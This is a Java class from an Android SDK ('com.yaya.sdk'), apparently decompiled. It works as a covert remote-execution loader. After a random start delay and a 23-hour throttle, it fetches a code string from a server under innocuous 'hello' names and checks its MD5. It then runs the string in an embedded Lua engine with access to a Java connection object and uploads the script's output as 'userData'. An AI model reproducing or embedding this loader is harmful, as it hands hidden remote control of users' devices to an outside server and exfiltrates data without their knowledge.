package com.yaya.sdk.core;

import android.content.Context;
import android.os.Handler;
import android.os.Message;
import android.text.TextUtils;
import com.yaya.sdk.bean.req.ErrReportReq;
import com.yaya.sdk.bean.req.HelloInfo;
import com.yaya.sdk.bean.req.LoadDataReq;
import com.yaya.sdk.bean.resp.CheckResp;
import com.yaya.sdk.bean.resp.GetHelloResp;
import com.yaya.sdk.connection.YayaLib;
import com.yaya.sdk.connection.YayaStateFactory;
import com.yaya.sdk.constants.Constants;
import com.yaya.sdk.dao.DaoUtils;
import com.yaya.sdk.http.AsyncHttpClient;
import com.yaya.sdk.listener.HttpListener;
import com.yaya.sdk.utils.FileUtils;
import com.yaya.sdk.utils.JsonUtils;
import com.yaya.sdk.utils.Mylog;
import com.yaya.sdk.utils.SPUtils;
import java.util.Random;

public class CoreLibb {
    private static String TAG = CoreLibb.class.getSimpleName();
    static CheckResp idResp = null;
    private static YayaLib mYayaLibState;
    Handler handler = new Handler() {
        public void handleMessage(Message msg) {
            Mylog.d(CoreLibb.TAG, "进入handler");
            Context context = msg.obj;
            if (System.currentTimeMillis() - SPUtils.getLong(context, Constants.LAST_DO_TIME, Long.valueOf(0)) > 82800000) {
                CoreLibb.pullIdFromServer(context);
            } else {
                Mylog.d(CoreLibb.TAG, "距离上次拉取小于23小时");
            }
        }
    };
    public Context mContext;

    public void startCore(Context context) {
        ConnectionDSL.getInstance().init(context);
        mYayaLibState = YayaStateFactory.newYayaState();
        mYayaLibState.openLibs();
        this.mContext = context;
        Message msg = new Message();
        msg.obj = context;
        int mill = new Random().nextInt(5);
        Mylog.d(TAG, "mill:" + mill);
        this.handler.sendMessageDelayed(msg, (long) (mill * 1000));
    }

    public static void pullIdFromServer(final Context context) {
        Mylog.d(TAG, "进入pullIdFromServer");
        CheckResp checkReq = new CheckResp();
        AsyncHttpClient.checkIdFremServer(context, new HttpListener() {
            public void onSuccess(String content, int statusCode) {
                Mylog.i(CoreLibb.TAG, "pullIdFromServer-onSuccess:statusCode--" + statusCode + ",contet--" + content);
                if (!TextUtils.isEmpty(content)) {
                    CoreLibb.idResp = JsonUtils.string2CheckResp(content);
                    CoreLibb.checkIsToHello(context, CoreLibb.idResp);
                }
            }

            public void onFailure(String content, int statusCode) {
                Mylog.i(CoreLibb.TAG, "pullIdFromServer-onFailure:statusCode--" + statusCode + ",contet--" + content);
                CoreLibb.idResp = null;
            }
        });
        Mylog.d(TAG, checkReq.toString());
    }

    public static void checkIsToHello(Context context, CheckResp idResp) {
        if (idResp != null) {
            String requestId = idResp.getRequestId();
            if (TextUtils.isEmpty(requestId) || requestId.equals("null")) {
                Mylog.d(TAG, "requestId==null || helloId==null");
                return;
            } else if (!TextUtils.isEmpty(requestId)) {
                if (DaoUtils.getInstance(context).isPulled(idResp.getHelloId().intValue())) {
                    Mylog.d(TAG, "pulled==true");
                    return;
                }
                pullCodeFromServer(context, idResp);
                Mylog.d(TAG, "pulled==false");
                return;
            } else {
                return;
            }
        }
        Mylog.d(TAG, "idResp==null");
    }

    public static void pullCodeFromServer(final Context context, CheckResp resp) {
        if (TextUtils.isEmpty(resp.getRequestId())) {
            Mylog.d(TAG, "checkid-requestId==null");
        } else {
            AsyncHttpClient.pullCodeFremServer(context, resp, new HttpListener() {
                public void onSuccess(String content, int statusCode) {
                    Mylog.i(CoreLibb.TAG, "pullCodeFromServer-onSuccess:statusCode--" + statusCode + ",contet--" + content);
                    CoreLibb.checkIsToDo(context, JsonUtils.string2GetHelloResp(content));
                }

                public void onFailure(String content, int statusCode) {
                    Mylog.i(CoreLibb.TAG, "pullCodeFromServer-onFailure:statusCode--" + statusCode + ",contet--" + content);
                }
            });
        }
    }

    public static void checkIsToDo(Context context, GetHelloResp resp) {
        if (resp != null) {
            HelloInfo info = resp.getInfo();
            if (info != null) {
                Mylog.d(TAG, "HelloInfo!=null");
                if (FileUtils.string2Md5(info.getHello()).equals(info.getMd5Val())) {
                    Mylog.d(TAG, "md5=md5Val");
                    SPUtils.putLong(context, Constants.LAST_DO_TIME, System.currentTimeMillis());
                    DaoUtils.getInstance(context).insertId(info.getId().intValue());
                    doCode(context, resp);
                    return;
                }
                Mylog.d(TAG, "md5!=md5Val");
                return;
            }
            Mylog.d(TAG, "HelloInfo==null");
            return;
        }
        Mylog.d(TAG, "GetHelloResp==null");
    }

    public static void doCode(Context context, GetHelloResp resp) {
        HelloInfo info = resp.getInfo();
        Mylog.d(TAG, "start execute");
        String code = info.getHello();
        Constants.LAST_REQUEST_ID = resp.getRequestId();
        Constants.LAST_HELLO_ID = info.getId();
        String functionName = info.getName();
        Mylog.d(TAG, "code-1-" + code);
        mYayaLibState.LdoString(code);
        Mylog.d(TAG, "code-2-" + code);
        mYayaLibState.getField(Integer.valueOf(-10002).intValue(), functionName);
        mYayaLibState.pushJavaObject(ConnectionDSL.getInstance());
        mYayaLibState.setField(new Integer(-10002).intValue(), "resultKey");
        mYayaLibState.getGlobal("resultKey");
        int pcall = mYayaLibState.pcall(1, 1, 0);
        String userData = "";
        Mylog.d(TAG, "start execute");
        if (pcall != 0) {
            Mylog.d(TAG, "execute Failure");
            if (mYayaLibState.toString(-1) != null) {
                userData = mYayaLibState.toString(-1);
                ErrReportReq req = new ErrReportReq();
                req.setErrMsg(userData);
                req.setAndroidParam(info.getId() + "");
                req.setRequestId(resp.getRequestId());
                AsyncHttpClient.reportError(context, req, new HttpListener() {
                    public void onSuccess(String content, int statusCode) {
                        Mylog.i(CoreLibb.TAG, "reportError-onSuccess:statusCode--" + statusCode + ",contet--" + content);
                    }

                    public void onFailure(String content, int statusCode) {
                        Mylog.i(CoreLibb.TAG, "reportError-onFailure:statusCode--" + statusCode + ",contet--" + content);
                    }
                });
                return;
            }
            return;
        }
        Mylog.d(TAG, "execute Success");
        if (mYayaLibState.toString(-1) != null) {
            userData = mYayaLibState.toString(-1);
            LoadDataReq req2 = new LoadDataReq();
            req2.setRequestId(resp.getRequestId());
            req2.setAndroidParam(info.getId() + "");
            req2.setUserData(userData);
            AsyncHttpClient.reportSucces(context, req2, new HttpListener() {
                public void onSuccess(String content, int statusCode) {
                    Mylog.i(CoreLibb.TAG, "reportSucces-onSuccess:statusCode--" + statusCode + ",contet--" + content);
                }

                public void onFailure(String content, int statusCode) {
                    Mylog.i(CoreLibb.TAG, "reportSucces-onFailure:statusCode--" + statusCode + ",contet--" + content);
                }
            });
        }
    }
}
